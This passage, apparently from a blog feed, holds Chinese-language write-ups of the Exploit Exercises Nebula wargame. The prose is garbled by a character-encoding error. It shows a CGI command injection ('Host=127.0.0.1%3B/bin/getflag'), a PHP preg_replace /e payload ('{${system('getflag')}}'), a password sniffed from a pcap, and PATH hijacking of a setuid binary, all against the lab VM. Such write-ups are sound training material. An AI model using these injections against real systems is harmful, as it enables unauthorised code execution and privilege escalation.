&lt;p&gt;flag07å®¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ªthttpf.confï¼ˆperlæœåŠ¡å™¨é…ç½®ï¼‰å’Œindex.cgiï¼ˆå°±æ˜¯è¿™ä¸ªè„šæœ¬ï¼‰ã€‚å› æ­¤éœ€è¦æ‰§è¡Œå®ƒã€‚æ ¹æ®ç¨‹åºé€»è¾‘ï¼Œä¼ å…¥çš„&lt;code&gt;Host&lt;/code&gt;å‚æ•°ä¸ºpingçš„åœ°å€ã€‚æ¼æ´åˆ©ç”¨æ€è·¯å¾ˆç®€å•ï¼Œä¼ å…¥åœ°å€åæˆªæ–­ï¼Œå¹¶æ‰§è¡Œgetflagçš„ä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;é‚£å°±å¼€å§‹è¡ŒåŠ¨ï¼šé¦–å…ˆéœ€è¦çœ‹çœ‹perlçš„æœåŠ¡å™¨è·‘èµ·æ¥æ²¡&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;ps aux | grep thttpd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¦‚æœä¸å¹¸æ²¡è·‘èµ·æ¥ï¼Œé‚£å°±ç”¨nebulaç™»é™†ï¼Œä¹‹åï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;sudo -s
su flag07
/usr/sbin/thttpd -C /home/flag07/thttpf.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ ·å…ˆæŠŠè‡ªå·±å˜æˆrootï¼Œç„¶åå˜æˆflag07ï¼Œç„¶åæŠŠæœåŠ¡å™¨è·‘èµ·æ¥ã€‚å½“ç„¶è®°å¾—åˆ‡å›level07ç»§ç»­åšé¢˜ã€‚&lt;/p&gt;
&lt;p&gt;ä¹‹å&lt;code&gt;cat thttp.conf&lt;/code&gt;å‘ç°ç«¯å£æ˜¯7007ï¼Œéœ€è¦æ‰“å¼€ç•Œé¢æµ‹è¯•äº†ã€‚å› ä¸ºæœåŠ¡å™¨è¿˜æ²¡é…ç½®ç½‘ç»œï¼Œæ— æ³•ä»è¿œç¨‹è®¿é—®ï¼Œæœ¬ç€èƒ½ä¸é…ç½®å°±ä¸é…ç½®çš„çš„åŸåˆ™ï¼ˆå‚è§å¼€ç¯‡ï¼‰ï¼Œå°±ç”¨curlæˆ–è€…wgetå§ï¼ˆå› ä¸ºè¿™ä¸ªLinuxæ²¡æœ‰å›¾å½¢ç•Œé¢ï¼Œå› æ­¤æ²¡æœ‰æµè§ˆå™¨ï¼‰ã€‚å¾ˆä¸å¹¸ï¼Œcurlæ²¡æœ‰ï¼Œé‚£å°±wgetå§~&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæµ‹è¯•ä¸€ä¸‹ç•Œé¢ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;wget http://localhost:7007/index.cgi?Host=127.0.0.1 -O /home/level07/cgi.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å‘ç°ç•Œé¢OKï¼Œä¹‹åæ’å…¥åšåäº‹çš„ä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;wget http://localhost:7007/index.cgi?Host=127.0.0.1;/bin/getflag -O /home/level07/cgi.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¾ˆä¸å¹¸ï¼ŒæŠ¥é”™ã€‚æ ¹æ®é”™è¯¯å†…å®¹å‘ç°å‚æ•°æ²¡æœ‰è§£æå®Œï¼Œå› æ­¤å¯¹å‚æ•°ç”¨escapeç¼–ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;wget http://localhost:7007/index.cgi?Host=127.0.0.1%3B/bin/getflag -O /home/level07/cgi.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Doneï¼&lt;/p&gt;
&lt;h1&gt;Nebula level08&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/p&gt;
&lt;p&gt;åˆä¸€ä¸ªå…¨ä¸–ç•Œå¯è¯»æ–‡ä»¶æ”»å‡»ã€‚çœ‹çœ‹ç”¨æˆ·æƒ³å¹²å˜›ï¼Œç„¶åè¿›å…¥flag08è´¦æˆ·ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;é¢˜ç›®ç›´æ¥çœ‹æ‡µäº†ï¼Œä»€ä¹ˆå«world readableï¼Ÿ&lt;/p&gt;
&lt;p&gt;è¿›å…¥level08è´¦æˆ·ï¼Œåˆ‡æ¢åˆ°flag08ç›®å½•ï¼Œå‘ç°ä¸€ä¸ª.pcapæ–‡ä»¶ï¼Œæç„¶å¤§æ‚Ÿï¼ŒåŸæ¥world readableæ˜¯è¿™ä¸ªæ„æ€â€¦â€¦æ‰€ä»¥è¯´éŸ³ä¹å•Šç¾æœ¯å•Šä¹Ÿæ˜¯world readableå•Š~å¥½ä¸€ä¸ªå½¢å®¹è¯ã€‚&lt;/p&gt;
&lt;p&gt;æ—¢ç„¶æ˜¯.pcapï¼Œé‚£å°±å¾—åˆ†æåŒ…ã€‚å¾—å…ˆæŠŠ.pcapæå‡ºæ¥åˆ°æœ‰å›¾å½¢ç•Œé¢çš„æœºå™¨ä¸Šã€‚çœ‹æ¥è¿˜æ˜¯è¦é…ç½®ç½‘ç»œï¼ˆä¸Šä¸€é¢˜ç™½å·æ‡’äº†ï¼Œå‡ºæ¥æ··ï¼Œè¿˜æ˜¯è¦è¿˜çš„T^Tï¼‰ã€‚å…¶å®ç½‘ç»œé…ç½®ä¹Ÿå¾ˆç®€å•ï¼Œå› ä¸ºéå®‰è£…çš„ç³»ç»Ÿï¼Œé…ä¸ªä¸´æ—¶çš„ç½‘ç»œé…ç½®å°±å¯ä»¥ã€‚è¿›å…¥nebulaï¼Œä¹‹åï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;sudo ifconfig eth0 192.168.1.50 netmask 255.255.255.0
sudo ifconfig eth0 up
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ ·è¿™å°æœºå™¨å°±æœ‰192.168.1.50äº†ipäº†ï¼Œpingä¸€ä¸‹çœ‹çœ‹é€šä¸é€šï¼ˆä¸é€šçš„è¯æŸ¥çœ‹ä¸€ä¸‹è™šæ‹Ÿæœºçš„ç½‘å¡æ˜¯å¦å¼€å¯ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;ç»§ç»­æœ¬ç€å·æ‡’åŸåˆ™ï¼Œå¦‚æœä¸è£…è½¯ä»¶æ€ä¹ˆæŠŠè¿™ä¸ªæ–‡ä»¶æ‹·è´å‡ºæ¥å‘¢ã€‚é‚£å…ˆæŸ¥æŸ¥ç«¯å£ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;netstat -anpt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ²¡ä»€ä¹ˆå¯ç”¨ç«¯å£ï¼Œä¸è¿‡çœ‹åˆ°éè¿›ç¨‹çš„22ç«¯å£ï¼Œæƒ³åˆ°äº†sftpã€‚äºæ˜¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;which sftp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æœç„¶æœ‰sftpå®¢æˆ·ç«¯ï¼Œç»§ç»­æœç´¢æœåŠ¡å™¨ç«¯ï¼Œæ— æœã€‚ä¸è¿‡æ²¡äº‹ï¼Œæœ‰å®¢æˆ·ç«¯å°±å¤Ÿäº†ã€‚
åœ¨å¦ä¸€å°æœ‰å›¾å½¢ç•Œé¢çš„Linuxä¸­å¼€å¯SFTPï¼ˆip:192.168.1.200ï¼‰ï¼Œä¹‹ååœ¨level08ä¸­æ‰§è¡Œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;sftp root@192.168.1.200
put capture.pcap
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç„¶ååœ¨æŠŠcapture.pcapæ‹–åˆ°wiresharké‡Œé¢ï¼Œå¼€å§‹åˆ†æåŒ…ã€‚é¢„åˆ¤åº”è¯¥æ˜¯ç”¨æˆ·ç™»å½•è¿‡ç¨‹æ²¡åŠ å¯†ï¼Œç„¶åç•™ä¸‹äº†ç™»å½•å¯†ç ä¹‹ç±»çš„ä¿¡æ¯ã€‚æ‰€ä»¥ä¸å‡ºæ„å¤–åº”è¯¥æ˜¯TCPåŒ…ï¼Œäºæ˜¯Followä¸€ä¸‹TCPåŒ…ï¼Œä¸€è¡Œå¤§å­—æ˜ å…¥çœ¼å¸˜&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;Password: backdoor...00Rm8.ate
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ ¹æ®ç»éªŒï¼Œä¸€èˆ¬16è¿›åˆ¶å·¥å…·ä¸­&lt;code&gt;.&lt;/code&gt;éƒ½æ˜¯ä»£è¡¨&lt;code&gt;\0&lt;/code&gt;ï¼Œå°±æ˜¯å­—ç¬¦ä¸²ç»“å°¾ï¼ˆå…¶å®&lt;code&gt;.&lt;/code&gt;è¡¨ç¤ºä¸å¯è¯»å­—ç¬¦ï¼Œä¸€èˆ¬åœ¨ä¸€å †å­—ç¬¦ä¸²ä¸­æ—¶åŸºæœ¬å°±æ˜¯&lt;code&gt;\0&lt;/code&gt;ï¼‰ï¼Œæ‰€ä»¥å¯†ç åº”è¯¥æ˜¯backdoorã€‚å°è¯•ç™»å½•ï¼Œé”™è¯¯ï¼äºæ˜¯åœ¨wiresharkä¸­å§TCPåŒ…åˆ‡æ¢åˆ°HEXæ˜¾ç¤ºï¼Œå‘ç°è¿™æ®µæ•°æ®ä¿¡æ¯å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;000000B9  62                  b
000000BA  61                  a
000000BB  63                  c
000000BC  6b                  k
000000BD  64                  d
000000BE  6f                  o
000000BF  6f                  o
000000C0  72                  r
000000C1  7f                  .
000000C2  7f                  .
000000C3  7f                  .
000000C4  30                  0
000000C5  30                  0
000000C6  52                  R
000000C7  6d                  m
000000C8  38                  8
000000C9  7f                  .
000000CA  61                  a
000000CB  74                  t
000000CC  65                  e
000000CD  0d                  .
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç«Ÿç„¶æ˜¯7Fï¼ŒæŸ¥ASCIIç è¡¨å‘ç°7Fæ˜¯Backspaceï¼ˆé€€æ ¼ï¼‰ï¼Œ0Dæ˜¯CRï¼ˆå›è½¦ï¼‰ï¼Œæ‰€ä»¥å°±æŒ‰ç…§è¿™ä¸ªé¡ºåºé‡æ–°æ¯”åˆ’äº†ä¸‹ï¼Œå¾—åˆ°å¯†ç æ˜¯backd00Rmateã€‚æ­¤é¢˜æ‹¿ä¸‹ï¼&lt;/p&gt;
&lt;h1&gt;Nebula level09&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There's a C setuid wrapper for some vulnerable PHP code...&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªCç”¨setuidåŒ…è£…åçš„è„†å¼±çš„PHPä»£ç â€¦â€¦&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="php"&gt;&amp;lt;?php

function spam($email)
{
  $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email);
  $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email);

  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;çœ‹åˆ°PHPï¼Œå¿ƒä¸­å¤§å–œï¼Œæ€»ç®—ç¢°åˆ°ä¸€ä¸ªç›¸å¯¹ç†Ÿæ‚‰çš„è¯­è¨€ï¼Œè€ä¹¡è§è€ä¹¡ï¼Œä¸¤çœ¼æ³ªæ±ªæ±ªå•Š~~&lt;/p&gt;
&lt;p&gt;flag09ç›®å½•ä¸‹æœ‰ä¸€ä¸ªå¯æ‰§è¡Œçš„flag09ï¼ˆè¿™å°±æ˜¯æ‰€è°“å…·æœ‰SetUIDçš„Cè¯­è¨€åŒ…è£…çš„PHPè§£é‡Šå™¨å§ï¼‰ï¼Œè¿˜æœ‰ç»™å‡ºä»£ç çš„flag09.phpã€‚ä»£ç é€»è¾‘è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶è·¯å¾„ï¼Œä¸€ä¸ªæ²¡æœ‰ç”¨åˆ°ã€‚æ ¹æ®æ–‡ä»¶è·¯å¾„è¯»å‡ºæ–‡ä»¶ä¹‹åæŠŠEmailé‚£éƒ¨åˆ†è¯»å‡ºæ¥ï¼Œæ›¿æ¢æ‰ä¸€äº›å­—ç¬¦ï¼ˆååƒåœ¾é‚®ä»¶ï¼‰ï¼Œä¹‹åè¾“å‡ºã€‚&lt;/p&gt;
&lt;p&gt;æ²¡çœ‹å‡ºä»€ä¹ˆæœ‰é—®é¢˜çš„åœ°æ–¹ï¼Œä¸è¿‡ä¼ å…¥å‚æ•°ä¸€å®šæ˜¯å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚preg_replaceä¸­çš„eå‚æ•°ç”¨çš„ä¸å¤šå‘€ï¼Œä¸€èˆ¬éƒ½æ˜¯ç”¨iï¼ˆå¿½ç•¥å¤§å°å†™ï¼‰ã€‚äºæ˜¯æŸ¥PHP Manualï¼Œæœä¸å…¶ç„¶ï¼Œeä½¿preg_replaceç¬¬äºŒä¸ªå‚æ•°å˜æˆå‡½æ•°æ‰§è¡Œï¼Œå°±å’Œæ‰§è¡Œevalä¸€æ ·ï¼Œå¦å¤–è¿™ä¸ªå‚æ•°å¤ªå±é™©ï¼Œåœ¨PHP5.5ä¹‹ååºŸé™¤æ”¹ç”¨å›è°ƒå‡½æ•°å®ç°äº†ã€‚ä¸€å¥è¯æœ¨é©¬æš´éœ²äº†ï¼é‚£å°±æ„é€ ä¸€ä¸‹å‘—ã€‚&lt;/p&gt;
&lt;p&gt;äºæ˜¯æ„é€ æ–‡ä»¶å†…å®¹ä¸º:&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;[email abc@def.com\&amp;quot;);system(\&amp;quot;getflag]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç…§ç†è¯´ç¬¬äºŒä¸ªå‚æ•°åº”è¯¥è¢«æ‹¼æ¥æˆ:&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;&amp;quot;spam(\&amp;quot;email abc@def.com\&amp;quot;);system(\&amp;quot;getflag\&amp;quot;)&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ ·å°±èƒ½é¡ºåˆ©æ‰§è¡Œä¸¤ä¸ªå‡½æ•°äº†ã€‚å¾ˆå¯æƒœï¼Œå¤©ä¸ç”±äººæ„¿ï¼Œæ•´ä¸ªä¸œè¥¿éƒ½è¢«å½“åšå­—ç¬¦ä¸²è¢«æ‰”åˆ°spamå‡½æ•°é‡Œäº†ã€‚æ‰€ä»¥è¿™é‡Œå¦‚æœè¦æ¢ç©¶å¾—çœ‹ä¸€ä¸‹PHPæºç ä¸­å…·ä½“çš„å¤„ç†è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;é¡¿æ—¶æ²¡æ€è·¯äº†â€¦â€¦ä¹‹åGoogleä¸€ä¸‹phpçš„preg_replaceçš„eå‚æ•°çš„æ¼æ´ï¼Œå‘ç°æœ‰åˆ©ç”¨&lt;code&gt;{${function()}}&lt;/code&gt;çš„æŠ€å·§ã€‚å³åœ¨&lt;code&gt;{${}}&lt;/code&gt;åŒ…è£¹åçš„å‡½æ•°ä¼šè¢«æ‰§è¡Œã€‚äºæ˜¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;[email {${system('getflag')}}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;K.Oï¼&lt;/p&gt;</summary><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>Exploit Exercises Nebula level00-04 Writeup</title><link href="http://blog.yyx.name/posts/exploit-exercises-nebula-level-00-04.html" rel="alternate"></link><updated>2014-09-06T16:20:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-06:posts/exploit-exercises-nebula-level-00-04.html</id><summary type="html">&lt;h1&gt;å†™åœ¨å‰é¢&lt;/h1&gt;
&lt;p&gt;ä¸Šä¸Šä¸ªæœˆæˆç«‹watch0utæˆ˜é˜Ÿä¹‹åï¼Œå¼€å§‹å‡†å¤‡å¹¶å‚ä¸ä¸€äº›CTFæ¯”èµ›ã€‚é˜Ÿå‹å¤§ç¥Jackç”©ç»™æˆ‘ä»¬&lt;a href="http://exploit-exercises.com/"&gt;exploit-exercises.com&lt;/a&gt;è¿™ä¸ªç½‘ç«™ï¼Œè®©æˆ‘ä»¬ç»ƒä¹ ç»ƒä¹ æ¼æ´åˆ©ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ç½‘ç«™ä¸­æŠŠæ¼æ´åˆ©ç”¨åˆ†ä¸ºå¤šç±»é¢˜å‹ï¼Œå…¶ä¸­Nebulaæœ€ä¸ºç®€å•ï¼Œä¸»è¦æ¶‰åŠLinuxä¸»æœºå®‰å…¨åŠåˆ©ç”¨çš„ä¸€äº›å¸¸è¯†ï¼Œå¯ä½œä¸ºæ•´ä¸ªç»ƒä¹ çš„å¼€å§‹ã€‚&lt;/p&gt;
&lt;p&gt;å¦ï¼Œæœ¬æ–‡ä¼šéµå¾ªèƒ½ä¸ç”¨å®‰è£…å°±å®‰è£…ï¼Œèƒ½ä¸é…ç½®å°±ä¸é…ç½®çš„æœ€(å·)ç®€(æ‡’)ç­–ç•¥æ¥å®Œæˆæ‰€æœ‰é¢˜å‹ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬æ–‡ä¼šè®°å½•æˆ‘è‡ªå·±åšé¢˜çš„æ€è·¯å’Œæ‰‹æ³•ï¼Œä¾›å¤§å®¶å‚è€ƒï¼Œä¹Ÿå¸Œæœ›è¯¸ä½èƒ½æŒ‡å‡ºæˆ‘ç†è§£æˆ–æ“ä½œä¸æ…å¤„ã€‚&lt;/p&gt;
&lt;h1&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;
&lt;p&gt;é¦–å…ˆ&lt;a href="http://exploit-exercises.com/download"&gt;ä¸‹è½½&lt;/a&gt;Nebulaé¢˜ç›®çš„å…‰ç›˜é•œåƒï¼Œè¯¥ISOä¸ºLiveCDã€‚å› æ­¤å¯ä»¥ä¸ç”¨å®‰è£…ï¼Œç›´æ¥åˆ©ç”¨ç°æˆè™šæ‹Ÿæœºä¿®æ”¹ä¸ºä»è¯¥ISOå¯åŠ¨å³å¯ã€‚æ¯æ¬¡æ“ä½œå®Œæ•´ä¹‹åç›´æ¥ç‚¹â€œæš‚åœâ€ä¿å­˜è™šæ‹ŸæœºçŠ¶æ€å³å¯ï¼Œä¸‹æ¬¡ç›´æ¥æ¢å¤ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥å®‰è£…è¯¥ISOã€‚&lt;/p&gt;
&lt;p&gt;å¦å¤–ï¼Œæˆ‘ä½¿ç”¨çš„å…‰ç›˜ä¸ºexploit-exercises-nebula-5.isoï¼Œæœ¬ç³»åˆ—Writeupå…¨éƒ¨åœ¨è¿™ä¸ªç‰ˆæœ¬ä¸Šå®Œæˆã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;Nebula
----------------------------------------------------------------------------------------------
Download        exploit-exercises-nebula-5.iso
----------------------------------------------------------------------------------------------
Version         5
----------------------------------------------------------------------------------------------
Changes         Moved from OVA to bootable CD format. Reduces issues with importing OVA files.
----------------------------------------------------------------------------------------------
SHA1 Checksum   e82f807be06100bf3e048f82e899fb1fecc24e3a
&lt;/code&gt;&lt;/pre&gt;

&lt;h1&gt;ç»Ÿä¸€è§„åˆ™&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;æ¯æ¬¡ä»»åŠ¡ä½¿ç”¨ä»»åŠ¡çš„levelè´¦æˆ·ç™»å½•å¹¶æ‰§è¡Œflagè´¦æˆ·æƒé™å¯æ‰§è¡Œçš„getflagæ–‡ä»¶ï¼ˆä¸€èˆ¬æ˜¯è¿™ä¸ªåå­—ï¼‰ã€‚æ¯”å¦‚ï¼Œä»»åŠ¡1ä½¿ç”¨level01è´¦æˆ·ï¼Œå¯†ç ä¹Ÿä¸ºlevel01ï¼Œä½ éœ€è¦å»å¯»æ‰¾æ–¹æ³•è·å–flag01æ‰å¯ä»¥æ‰§è¡Œçš„getflagæ–‡ä»¶å¹¶æ‰§è¡Œå®ƒã€‚&lt;/li&gt;
&lt;li&gt;å½“éœ€è¦ç³»ç»Ÿé…ç½®æ—¶ï¼Œä½¿ç”¨nebulaè´¦æˆ·ï¼Œå¯†ç ä¹Ÿä¸ºnebulaï¼Œå¹¶åˆ©ç”¨sudoæ‰§è¡Œéœ€è¦rootæƒé™çš„æ“ä½œã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Nebula level00&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;This level requires you to find a Set User ID program that will run as the "flag00" account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.&lt;/p&gt;
&lt;p&gt;Alternatively, look at the find man page.&lt;/p&gt;
&lt;p&gt;è¯¥é¢˜è¦æ±‚å¯»æ‰¾ä¸€ä¸ªå¯ä»¥SetUIDçš„ç¨‹åºï¼ˆè¯¥ç¨‹åºå±äºflag00è´¦æˆ·ï¼‰å¹¶è¿è¡Œå®ƒã€‚ä½ å¯ä»¥ä»/ï¼ˆæ ¹ç›®å½•ï¼‰å¼€å§‹å¯»æ‰¾ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç›®æ ‡å¾ˆæ˜ç¡®ï¼Œæœç´¢ä¸€ä¸‹å±äºflag00è´¦æˆ·çš„å¸¦æœ‰SetUIDæƒé™çš„ç¨‹åºå³å¯ã€‚æœæ–­man findï¼Œæœç´¢ä¸€ä¸‹å’Œæƒé™ç›¸å…³çš„å‚æ•°ï¼Œæ‰¾åˆ°&lt;code&gt;-perm&lt;/code&gt;ï¼Œå¹¶ä¸”çœ‹åˆ°è¯¥å‚æ•°ååŠ å…¥&lt;code&gt;-mode&lt;/code&gt;å¯ä»¥æŒ‡å®šåŒ¹é…æ‰€æœ‰å…·æœ‰è¿™ä¸ªæƒé™çš„æ–‡ä»¶ï¼ˆæ³¨æ„å’Œ&lt;code&gt;mode&lt;/code&gt;åŠ&lt;code&gt;/mode&lt;/code&gt;çš„åŒºåˆ«ï¼Œè¿™ä¸ª&lt;code&gt;-&lt;/code&gt;æ„å‘³ç€æƒé™çš„åŒ…å«å…³ç³»ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;åˆ°è¿™å„¿æˆ‘ä»¬éœ€è¦å›é¡¾ä¸€ä¸‹Linuxä¸‹æƒé™çš„è¡¨ç¤ºæ–¹å¼ï¼šLinuxçš„fsä¸­ï¼Œæ‰€æœ‰æ–‡ä»¶/ç›®å½•/è®¾å¤‡ç­‰éƒ½å…·æœ‰ä¸‰ä¸ªçº§åˆ«çš„ç”¨æˆ·æƒé™æ§åˆ¶ï¼Œåˆ†åˆ«æ˜¯uæ‰€æœ‰è€…ï¼Œgæ‰€å±ç¾¤ç»„ï¼Œoå…¶ä»–ç”¨æˆ·ã€‚å¯¹äºæ¯ä¸ªçº§åˆ«ï¼Œåˆèƒ½åˆ†åˆ«æ§åˆ¶rè¯»wå†™xæ‰§è¡Œæƒé™ã€‚å¦å¤–ï¼Œè¿˜æœ‰SetUIDå’ŒSetGIDçš„ç‰¹æ®Šæƒé™ä½ã€‚&lt;/p&gt;
&lt;p&gt;æƒé™è¡¨ç¤ºçš„æ—¶å€™ï¼Œrwxå’Œæ— æƒé™&lt;code&gt;-&lt;/code&gt;åˆ†åˆ«ç”¨æ•°å­—4210è¡¨ç¤ºï¼Œå¹¶æ‰§è¡Œä½æˆ–è¿ç®—ï¼Œè¿™æ ·ä¸€ä¸ªçº§åˆ«çš„ç”¨æˆ·æƒé™å°±å¯ä»¥è¡¨ç¤ºäº†ï¼ˆå ç”¨ä¸€ä¸ªbyteï¼‰ã€‚è¿™ç§æ–¹æ³•å¯ä»¥è¡¨ç¤ºå‡ºä¸‰ä¸ªä¸åŒç”¨æˆ·çº§åˆ«çš„æƒé™ã€‚åŒæ—¶åŠ å…¥æœ€å‰é¢8bitsçš„ç‰¹æ®Šæƒé™ä½ï¼Œå°±å¯ä»¥ç”¨4byteè¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶çš„å®Œæ•´æƒé™ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;u       g       o
rwx     r--     r--     0744
rwx     ---     ---     0700
rws     rwx     rwx     4777
rws     rws     rwx     6777
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æŒ‰ç…§è¿™ä¸ªæ ‡å‡†ï¼Œæˆ‘ä»¬è¿™å„¿éœ€è¦æœç´¢çš„æ–‡ä»¶éœ€è¦SetUIDï¼Œå› æ­¤å¯ä»¥æ„é€ æƒé™è¡¨ç¤ºä¸º-u=sæˆ–è€…-4000ï¼Œå†è€ƒè™‘åˆ°é’ˆå¯¹æ–‡ä»¶æœç´¢ï¼ˆé™å®šç±»å‹ä¸ºæ–‡ä»¶ï¼‰ï¼Œå› æ­¤å¯ä»¥æ„é€ å¦‚ä¸‹å‘½ä»¤ï¼ˆä¸¤è€…ä¸€è‡´ï¼‰ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;find / -perm -u=s -type f -user flag00 &amp;gt; flag.txt
find / -perm -4000 -type f -user flag00 &amp;gt; flag.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¹‹åæŸ¥çœ‹flag.txtä¸­å†…å®¹ï¼Œå¯ä»¥å‘ç°æœç´¢åˆ°ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ‰§è¡Œç¬¬ä¸€ä¸ª&lt;code&gt;/bin/.../flag00&lt;/code&gt;å³å¯è¿‡å…³ã€‚&lt;/p&gt;
&lt;h1&gt;Nebula level01&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;p&gt;é¢˜ç›®è¯´ç¨‹åºæœ‰æ¼æ´å…è®¸ä»»æ„ç¨‹åºæ‰§è¡Œã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(&amp;quot;/usr/bin/env echo and now what?&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç¨‹åºé€»è¾‘å¾ˆç®€å•ï¼šSetUIDå’ŒSetGIDåæ‰§è¡Œç¯å¢ƒå˜é‡æŒ‡å®šçš„echoæ–‡ä»¶ï¼Œè¿™æ ·&lt;code&gt;and now what?&lt;/code&gt;å°±æ˜¯å‚æ•°ã€‚å› æ­¤é©¬ä¸Šèƒ½å¾—åˆ°å¦‚ä¸‹æ€è·¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;çœ‹åˆ°&lt;code&gt;/usr/bin/env&lt;/code&gt;å°±ç«‹å³ååº”è¿‡æ¥å¯ä»¥ä»ç¯å¢ƒå˜é‡ä¸‹æ‰‹ï¼Œä¿®æ”¹åä¼˜å…ˆæ‰§è¡Œè‡ªå·±çš„ç¨‹åºã€‚&lt;/li&gt;
&lt;li&gt;éœ€è¦è¿è¡Œgetflagï¼Œè€Œç¨‹åºåªèƒ½è¿è¡Œechoï¼Œå› æ­¤è¦æŠŠechoå’Œgetflagå…³è”ä¸Šã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;äºæ˜¯ä¹ä¸€æ°”å‘µæˆæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;ln -s /bin/getflag echo
PATH=/home/level01:$PATH
cd /home/flag01
./flag01
&lt;/code&gt;&lt;/pre&gt;

